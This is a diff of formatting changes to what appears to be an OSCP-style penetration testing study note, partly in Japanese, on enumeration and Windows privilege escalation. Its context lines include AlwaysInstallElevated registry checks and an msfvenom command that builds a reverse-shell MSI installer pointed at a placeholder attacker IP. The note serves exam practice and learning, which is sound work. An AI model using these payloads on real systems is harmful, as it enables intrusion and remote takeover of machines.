@@ -33,14 +33,12 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+
 
 ### Not implemented (or log not saved)
 
-```
 
 ### 2. Local Shell
 
@@ -90,7 +88,7 @@ icacls "C:\Program Files\Vuln App\"
 
 ### 2-3. AlwaysInstallElevated
 
-```
+```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o privesc.msi
@@ -123,7 +121,6 @@ Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Patter
 
 Arena 系は「網羅的列挙の型」を体に覚えさせる用途です。  
 OSCP本番では 1 つずつバラバラに見える misconfiguration を、同じチェックリストで潰せるかが勝負になります。
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
@@ -136,7 +133,7 @@ Initial access succeeds when enumeration findings are turned into a practical ex
 
 During the privilege escalation phase, we will prioritize checking for misconfigurations such as `sudo -l` / SUID / service settings / token privilege. By starting this check immediately after acquiring a low-privileged shell, you can reduce the chance of getting stuck.
 
-```bash
+```
 whoami
 whoami /priv
 systeminfo
